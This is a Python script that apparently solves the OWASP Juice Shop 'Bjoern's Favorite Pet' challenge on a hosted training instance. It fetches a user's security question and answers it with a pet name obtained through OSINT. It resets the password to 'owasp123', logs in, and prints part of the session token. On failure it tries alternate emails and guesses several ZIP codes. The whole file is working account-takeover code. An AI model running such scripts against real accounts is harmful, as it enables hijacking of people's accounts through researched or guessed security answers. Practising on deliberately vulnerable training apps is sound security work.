#!/usr/bin/env python3
"""
Bjoern's Favorite Pet - Password Reset Solution
Reset Bjoern's OWASP account password using his pet's name
"""

import requests
from urllib.parse import quote
import json


def solve_bjoern_pet_challenge():
    """Reset Bjoern's password using his favorite pet's name"""
    
    session = requests.Session()
    base_url = "https://juice3.wonkatech.org"
    
    print("="*60)
    print("🐱 BJOERN'S FAVORITE PET - PASSWORD RESET CHALLENGE")
    print("="*60)
    
    # The correct email for Bjoern's OWASP account
    email = "bjoern@owasp.org"
    
    # First try bjoern@owasp.org
    print(f"\n1️⃣ Attempting with: {email}")
    
    # Get security question
    r = session.get(f"{base_url}/rest/user/security-question?email={quote(email)}")
    
    if r.status_code == 200:
        data = r.json()
        question_id = data.get('id')
        
        # Handle both dict and string formats
        if isinstance(data.get('question'), dict):
            question_text = data.get('question', {}).get('question', '')
        else:
            question_text = data.get('question', '')
        
        print(f"   Security Question ID: {question_id}")
        print(f"   Security Question: {question_text}")
        
        # Bjoern's favorite pet is his cat named "Zaya"
        # This is public information from his Twitter/GitHub
        answer = "Zaya"
        
        print(f"\n2️⃣ Using answer: {answer}")
        print("   (Bjoern's cat, found via OSINT)")
        
        # Reset password
        reset_data = {
            "email": email,
            "answer": answer,
            "new": "owasp123",
            "repeat": "owasp123"
        }
        
        r = session.post(f"{base_url}/rest/user/reset-password", json=reset_data)
        
        if r.status_code == 200:
            print("\n✅ SUCCESS! Password reset completed!")
            print("   New password: owasp123")
            
            # Verify by logging in
            r = session.post(f"{base_url}/rest/user/login", json={
                "email": email,
                "password": "owasp123"
            })
            
            if r.status_code == 200:
                print("✅ Verified: Successfully logged in with new password!")
                token = r.json()['authentication']['token']
                print(f"   Token: {token[:20]}...")
            
            return True
        else:
            print(f"\n❌ Reset failed: {r.status_code}")
            print(f"   Response: {r.text[:200]}")
    else:
        print(f"\n⚠️ No security question found for {email}")
        print("   Trying alternative email addresses...")
    
    # Try alternative emails
    alternative_emails = [
        "bjoern@juice-sh.op",
        "bjoern.kimminich@juice-sh.op"
    ]
    
    for alt_email in alternative_emails:
        print(f"\n3️⃣ Trying: {alt_email}")
        
        r = session.get(f"{base_url}/rest/user/security-question?email={quote(alt_email)}")
        
        if r.status_code == 200:
            data = r.json()
            
            # Handle both dict and string formats
            if isinstance(data.get('question'), dict):
                question_text = data.get('question', {}).get('question', '')
            else:
                question_text = data.get('question', '')
            
            print(f"   Question: {question_text}")
            
            # Determine answer based on question
            if "pet" in question_text.lower() or "favorite" in question_text.lower():
                answer = "Zaya"
                print(f"   Using answer: {answer} (his cat)")
            elif "zip" in question_text.lower() or "postal" in question_text.lower():
                # German ZIP codes where Bjoern might have lived
                possible_zips = ["28199", "20457", "22767", "20359", "21029"]
                
                for answer in possible_zips:
                    print(f"   Trying ZIP: {answer}")
                    
                    reset_data = {
                        "email": alt_email,
                        "answer": answer,
                        "new": "owasp123",
                        "repeat": "owasp123"
                    }
                    
                    r = session.post(f"{base_url}/rest/user/reset-password", json=reset_data)
                    
                    if r.status_code == 200:
                        print(f"\n✅ SUCCESS with {alt_email}!")
                        print(f"   Answer: {answer}")
                        print("   New password: owasp123")
                        
                        # Verify login
                        r = session.post(f"{base_url}/rest/user/login", json={
                            "email": alt_email,
                            "password": "owasp123"
                        })
                        
                        if r.status_code == 200:
                            print("✅ Login verified!")
                        
                        return True
            else:
                # Try Zaya anyway as it's his known pet
                answer = "Zaya"
                print(f"   Trying answer: {answer}")
                
                reset_data = {
                    "email": alt_email,
                    "answer": answer,
                    "new": "owasp123",
                    "repeat": "owasp123"
                }
                
                r = session.post(f"{base_url}/rest/user/reset-password", json=reset_data)
                
                if r.status_code == 200:
                    print(f"\n✅ SUCCESS with {alt_email}!")
                    print("   New password: owasp123")
                    return True
    
    print("\n" + "="*60)
    print("📝 SUMMARY")
    print("="*60)
    print("\nBjoern's favorite pet is his cat named 'Zaya'")
    print("This information is publicly available from his social media")
    print("\nThe challenge requires:")
    print("1. Finding the correct email (bjoern@owasp.org or bjoern@juice-sh.op)")
    print("2. Knowing his cat's name is 'Zaya'")
    print("3. Using the password reset mechanism with this answer")
    
    # Check progress
    print("\n" + "="*60)
    r = session.get(f"{base_url}/api/Challenges")
    if r.status_code == 200:
        data = r.json()['data']
        solved = [c for c in data if c.get('solved')]
        print(f"📊 Progress: {len(solved)}/110 ({len(solved)*100//110}%)")
        print(f"📌 Need {55 - len(solved)} more for 50%")
    
    return False


if __name__ == "__main__":
    solve_bjoern_pet_challenge()